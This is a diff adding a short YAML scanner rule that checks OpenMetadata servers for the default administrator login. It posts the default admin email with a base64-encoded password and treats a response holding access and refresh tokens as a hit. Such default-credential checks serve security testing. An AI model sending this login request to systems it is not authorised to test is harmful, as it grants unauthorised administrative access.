@@ -1,0 +1,16 @@
+name: openmetadata-default-login
+transport: http
+rules:
+  - method: POST
+    path: /api/v1/users/login
+    follow_redirects: false
+    headers:
+      Content-Type: application/json
+    body: '{"email":"admin@open-metadata.org","password": "YWRtaW4="}'
+    expression: |
+      response.status==200 && response.body.bcontains(b'accessToken') && response.body.bcontains(b'refreshToken') 
+detail:
+  author: SH1INroot
+  links:
+    - https://cn-sec.com/archives/2590503.html
+
